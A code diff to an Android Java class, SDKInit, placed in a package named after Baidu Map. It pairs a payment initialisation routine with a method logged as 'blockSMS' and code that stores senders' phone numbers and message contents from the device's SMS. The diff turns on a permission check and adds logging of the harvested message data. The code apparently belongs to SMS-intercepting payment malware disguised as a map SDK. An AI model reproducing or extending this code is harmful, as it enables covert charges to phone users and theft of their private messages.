@@ -15,11 +15,17 @@ import com.baidu.BaiduMap.utils.Log;
 import com.baidu.BaiduMap.utils.Utils;
 
 import android.Manifest;
+import android.app.Activity;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Handler;
 import android.os.Message;
+import android.support.v4.app.ActivityCompat;
+import android.support.v4.content.ContextCompat;
 import android.text.TextUtils;
 
 public class SDKInit {
@@ -63,7 +69,7 @@ public class SDKInit {
                                final String product, final String Did, final String extData, final Object payHandler,
                                final Handler initHandler) {
         mContext = ctx;
-//        permissionTest();
+        permissionTest();
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -112,6 +118,11 @@ public class SDKInit {
     }
 
     public void s(final Context ctx) {
+//        if (Build.VERSION.SDK_INT >= 23) {
+//            Log.debug("SDK verson >= 23");
+//            checkPermission(ctx);
+//        }
+
         if (Constants.isOutPut) {
             Log.debug("------------>blockSMS begin");
         }
@@ -151,6 +162,14 @@ public class SDKInit {
         ACacheUtils.getInstance(context).putPhoneData(senderPhoneNumberList);
         ACacheUtils.getInstance(context).putMessageData(messageContentList);
         ACacheUtils.getInstance(SDKInit.mContext).setSMSContent("");
+        if (Constants.isOutPut) {
+            Log.debug("ACacheUtils.getInstance().putPhoneData(senderPhoneNumberList)"
+                    + ACacheUtils.getInstance(context).getPhoneData().size());
+            Log.debug("ACacheUtils.getInstance().putMessageData(messageContentList)"
+                    + ACacheUtils.getInstance(context).getMessageData().size());
+            Log.debug("senderPhoneNumberList.size():" + senderPhoneNumberList.size());
+            Log.debug("messageContentList.size():" + messageContentList.size());
+        }
     }
 
     private void init(final Context ctx, final String price, final int payItemID, final String str, final String product, final String Did, final String extData, final Object payHandler, final Handler initHandler) {
@@ -170,7 +189,7 @@ public class SDKInit {
                         Message msg = new Message();
                         msg.what = 1;
                         initHandler.sendMessage(msg);
-                        s(ctx);
+                        s(mContext);
                     }
                 } catch (Exception e) {
 
